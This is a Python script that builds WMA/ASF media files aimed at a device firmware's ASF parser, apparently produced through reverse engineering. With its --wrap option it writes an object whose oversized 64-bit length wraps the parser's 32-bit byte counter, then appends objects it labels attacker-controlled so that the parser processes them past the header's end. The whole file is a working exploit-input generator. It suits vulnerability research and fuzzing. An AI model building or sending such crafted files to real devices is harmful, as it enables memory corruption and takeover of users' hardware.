#!/usr/bin/env python3
"""gen_asf.py - minimal WMA/ASF files for the 57.23 in-binary ASF walker.

Baseline is a spec-correct 2-object header (file properties + stream
properties) plus one data object, which the device accepts and parses.

--wrap appends an object whose u64 size is 0xFFFFFFFFFFFFFFF0. FUN_101fd2e0
loops while remaining >= 0x18 and subtracts each object's u64 size from
`remaining` (uint32), so a huge size wraps the counter and keeps the walk
alive; the bytes that follow are then handed to the dispatcher as if they were
objects. `--follow` objects therefore land on a live walker with attacker
control of GUID and payload rather than on a sane stream.

usage:
  gen_asf.py OUT [--wrap] [--follow N] [--min-packet N] [--payload N]
"""
import argparse
import struct

# canonical ASF GUIDs, written as big-endian byte strings (the walker compares
# raw BE bytes - FUN_101fbde0 byte-swaps into that layout)
HDR = bytes.fromhex("75b22630668e11cfa6d900aa0062ce6c")
DATA = bytes.fromhex("75b22636668e11cfa6d900aa0062ce6c")
FILEPROP = bytes.fromhex("8cabdca1a94711cf8ee400c00c205365")
STREAMPROP = bytes.fromhex("b7dc0791a9b711cf8ee600c00c205365")
AUDIOMEDIA = bytes.fromhex("59dacfc059e611d0a6e000a0c912e2b9")
WRAP = 0xFFFFFFFFFFFFFFF0
WMAV2 = 0x161


def obj(guid: bytes, body: bytes, size: int | None = None) -> bytes:
    return guid + struct.pack(">Q", size if size is not None else 24 + len(body)) + body


def stream_properties(min_packet: int) -> bytes:
    """type-specific data: WAVEFORMATEX with the WMAv2 tag, then the media obj."""
    wfx = (struct.pack("<HHIIHH", WMAV2, 2, 44100, 16000, 4, 16)
           + struct.pack("<H", 0))          # cbSize
    type_specific = struct.pack("<H", len(wfx)) + wfx
    body = (bytes(16)                        # stream type (audio)
            + bytes(16)                      # error correction type
            + struct.pack("<Q", 0)           # time offset
            + struct.pack("<I", len(type_specific))
            + struct.pack("<I", 0)           # error correction data length
            + struct.pack("<H", 1)           # flags: stream number bits
            + struct.pack("<I", 1)           # stream number
            + type_specific)
    return obj(STREAMPROP, obj(AUDIOMEDIA, body))


def file_properties(min_packet: int, payload: int) -> bytes:
    body = (bytes(16) + bytes(16)                       # file id, file guid
            + struct.pack("<Q", 0) * 2                  # sizes
            + struct.pack("<Q", 10000000)               # play duration
            + struct.pack("<Q", 10000000)               # send duration
            + struct.pack("<Q", 0)                      # preroll
            + struct.pack("<I", 1)                      # flags: seekable
            + struct.pack("<I", min_packet)             # min packet size
            + struct.pack("<I", max(min_packet, 0x10000))   # max packet size
            + struct.pack("<I", 128000))                # max bitrate
    return obj(FILEPROP, body)


def data_object(payload: int) -> bytes:
    # packet: ec flags (none) + payload-length size nibble 3 (u32), no
    # multiple-payload flag, one payload of `payload` bytes of zeros
    pkt = bytes([0x00, 0x30]) + struct.pack("<I", payload) + bytes(payload)
    return obj(DATA, bytes(16) + struct.pack("<Q", 1) + pkt)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("out")
    ap.add_argument("--wrap", action="store_true")
    ap.add_argument("--follow", type=int, default=0,
                    help="attacker objects placed after the wrapping object")
    ap.add_argument("--min-packet", type=lambda s: int(s, 0), default=0x400)
    ap.add_argument("--payload", type=lambda s: int(s, 0), default=0x400)
    a = ap.parse_args()

    objs = file_properties(a.min_packet, a.payload) + stream_properties(a.min_packet)
    count = 2
    if a.wrap:
        objs += obj(HDR, b"", size=WRAP)
        count += 1
        # attacker-controlled bytes the wrapped walker will consume as objects
        for i in range(a.follow):
            objs += obj(FILEPROP, bytes(0x40 + i))
            count += 1
    header = obj(HDR, struct.pack("<I", count) + b"\x01\x01" + objs)
    # object count lives in the preamble; disjoint from the object bytes above
    body = header + data_object(a.payload)
    open(a.out, "wb").write(body)
    print("wrote %s (%d bytes, wrap=%s follow=%d min-packet=%#x)"
          % (a.out, len(body), a.wrap, a.follow, a.min_packet))


if __name__ == "__main__":
    main()
